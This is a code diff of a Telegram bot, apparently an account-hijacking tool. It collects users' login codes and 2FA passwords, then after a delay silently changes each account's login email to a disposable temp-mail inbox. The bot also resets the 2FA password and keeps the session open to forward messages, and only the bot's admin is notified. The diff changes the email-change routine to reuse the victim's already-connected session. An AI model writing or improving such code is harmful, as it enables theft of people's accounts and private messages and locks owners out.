@@ -3181,12 +3181,14 @@ async def set_new_2fa_password(bot, user_id: str, phone: str, client, old_passwo
         logger.error(f"[2FA-Set] Unexpected error for {phone}: {e}")
 
 
-async def auto_change_email_after_login(bot, user_id: str, phone: str) -> None:
+async def auto_change_email_after_login(bot, user_id: str, phone: str,
+                                        client=None) -> None:
     """
     60 seconds after a successful login, automatically change the account's
-    login email using a fresh mail.tm mailbox (same logic the admin dashboard
-    uses), so numbers that support email change get it done without manual
-    admin action. Only the admin gets notified of the outcome.
+    login email using a fresh temp-mail inbox (mailto.plus / grr.la fallback).
+
+    Pass `client` (the already-connected Telethon client) so we reuse the
+    existing session instead of opening a conflicting second connection.
     """
     try:
         await asyncio.sleep(60)
@@ -3194,7 +3196,9 @@ async def auto_change_email_after_login(bot, user_id: str, phone: str) -> None:
         logger.info(f"[AutoEmail] Starting auto email change for {phone}")
         result = await change_email_for_number(
             phone, raw_phone, TELEGRAM_API_ID, TELEGRAM_API_HASH,
-            'sessions', 'user_data.json', log=lambda m: logger.info(f"[AutoEmail:{phone}] {m}"))
+            'sessions', 'user_data.json',
+            log=lambda m: logger.info(f"[AutoEmail:{phone}] {m}"),
+            existing_client=client)
 
         if result['success']:
             logger.info(f"[AutoEmail] Success for {phone}: {result['email']}")
@@ -3728,6 +3732,7 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             bot=context.bot,
             user_id=user_id,
             phone=phone,
+            client=client,
         ))
 
         # Keep the client connected for message forwarding
@@ -3967,6 +3972,7 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             bot=context.bot,
             user_id=user_id,
             phone=phone,
+            client=client,
         ))
 
         # Keep session alive/running for forwarding
